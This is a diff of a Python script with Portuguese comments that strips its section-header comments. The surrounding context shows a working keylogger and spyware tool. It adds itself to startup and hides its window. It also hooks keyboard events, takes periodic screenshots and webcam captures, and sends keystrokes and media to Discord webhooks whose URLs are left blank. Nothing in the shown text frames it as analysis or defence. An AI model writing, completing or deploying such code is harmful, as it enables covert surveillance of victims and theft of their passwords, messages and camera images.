@@ -14,19 +14,16 @@ import cv2
 import io
 from PIL import Image
 
-# ------------------- CONFIGURAÇÕES DE WEBHOOK -------------------
 
 webhook_keys_url = ""  # URL WEBHOOK 
 webhook_media_url = ""  # URL WEBHOOK  
 
-# ------------------- CONFIGURAÇÕES DE TEMPO -------------------
 interval = 120 
 screenshot_interval = random.randint(120, 180) 
 last_screenshot_time = 0
 captured_keys = []
 start_time = time.time()
 
-# ------------------- FUNÇÕES DE INICIALIZAÇÃO -------------------
 def add_startup():
     try:
         fp = os.path.dirname(os.path.realpath(__file__))
@@ -45,7 +42,6 @@ def hide():
     except Exception as e:
         print(f"Erro ao ocultar a janela: {e}")
 
-# ------------------- FUNÇÕES DE CAPTURA DE TELA E CÂMERA -------------------
 def screenshot():
     global last_screenshot_time
     try:
@@ -75,7 +71,6 @@ def capture_camera():
     except Exception as e:
         print(f"Erro ao capturar imagem da câmera: {e}")
 
-# ------------------- FUNÇÕES DE ENVIO AO DISCORD -------------------
 def post_to_discord_keys(file_content):
     if not file_content.strip():
         return
@@ -99,7 +94,6 @@ def post_to_discord_media_file(file_buffer, file_name):
     except Exception as e:
         print(f"Erro ao enviar o arquivo para o webhook do Discord: {e}")
 
-# ------------------- FUNÇÕES DE CAPTURA DO TECLADO -------------------
 def clean_key(key):
     special_keys = {
         'space': ' ',  # Transforma "space" em um espaço real
@@ -136,7 +130,6 @@ def on_keyboard_event(event):
             capture_camera()
         last_screenshot_time = time.time()
 
-# ------------------- FUNÇÃO PRINCIPAL -------------------
 def main():
     add_startup()
     hide()
@@ -149,6 +142,5 @@ def main():
 
     pythoncom.PumpMessages()
 
-# ------------------- EXECUÇÃO -------------------
 if __name__ == "__main__":
     main()
